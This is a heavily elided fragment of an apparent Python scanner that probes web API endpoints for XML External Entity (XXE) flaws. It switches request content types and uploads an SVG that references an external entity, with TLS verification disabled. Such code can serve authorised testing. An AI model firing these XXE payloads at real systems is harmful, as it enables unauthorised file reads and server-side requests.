...
def detect_xml_endpoints(base_url, token=None):
    ...
    endpoints = ["/api/search", "/api/users", "/api/data", "/api/import", "/api/upload", "/ws/service", "/soap", "/xml"]
    xml_endpoints = []
    for ep in endpoints:
...
def test_content_type_switch(base_url, endpoint, token=None):
    ...
    try:
        json_resp = requests.post(url, headers=json_headers, json={"search": "test"}, timeout=10, verify=False)
  ...
  <text x="0" y="20">&xxe;</text>
    ...
    try:
        ...
        if resp.status_code in (200, 201):
            ...
            return [
                {"type": "SVG_XXE_UPLOAD", "endpoint": upload_endpoint, "status": resp.status_code, "severity": "HIGH"}
            ]
    except requests.RequestException as e:
        print(f"  [-] Error: {e}")
    return []
